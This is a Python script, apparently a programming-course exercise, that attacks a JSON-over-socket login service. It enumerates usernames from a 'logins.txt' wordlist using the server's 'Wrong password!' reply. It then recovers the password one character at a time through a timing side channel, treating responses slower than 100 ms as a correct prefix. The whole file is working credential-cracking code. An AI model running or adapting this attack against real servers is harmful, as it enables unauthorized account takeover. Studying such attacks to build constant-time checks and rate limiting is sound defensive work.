# write your code here
import argparse
import sys
import socket
import itertools
import json
import os
from datetime import datetime
from datetime import timedelta

#parser = argparse.ArgumentParser(description="hacking website passwords")

#parser.add_argument("addrress")
#parser.add_argument("port")
#parser.add_argument("password")

args = sys.argv

ipaddress = args[1]
port = int(args[2])

def gen_p(strpass):
    for l in strpass:
        yield l

def make_connection(ipaddress, port):

    strpass = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    with socket.socket() as c_socket:
        response = ''
        c_socket.connect((ipaddress, port))
        with open("logins.txt") as ps:
            for line in ps:
                log_dict = dict({"login": line.strip(), "password": ' '})
                log_json = json.dumps(log_dict).encode('utf8')
                c_socket.send(log_json)
                e_response = c_socket.recv(1024)
                response = json.loads(e_response.decode('utf8'))
                if response['result'] == 'Wrong password!':
                    login = line.strip()
                    break
            #print(login)
            guess = ''
            passwd = ''
            while response['result'] != 'Connection success!':
                for s in gen_p(strpass):
                    guess += s
                    #print(guess)
                    log_dict = dict({"login": login, "password": guess})
                    log_json = json.dumps(log_dict).encode('utf8')
                    try:
                        c_socket.send(log_json)
                    except:pass
                    else:
                        start = datetime.now()
                        e_response = c_socket.recv(1024)
                        finish = datetime.now()
                        difference = finish - start
                        if(e_response):
                            response = json.loads(e_response.decode())
                        #print(response['result'])
                        #print(difference)
                    if difference >= timedelta(milliseconds=100) and response['result'] == "Wrong password!":
                        passwd += s
                        guess = passwd
                        #print(log_json.decode('utf8'))
                        continue
                    elif response['result'] == "Wrong password!":
                        guess = passwd
                        #print(response)
                        #print(passwd)
                    elif response['result'] == 'Connection success!':
                        break
                if response['result'] == 'Connection success!':
                    break
    return log_json.decode()

response = make_connection(ipaddress, port)

print(response)
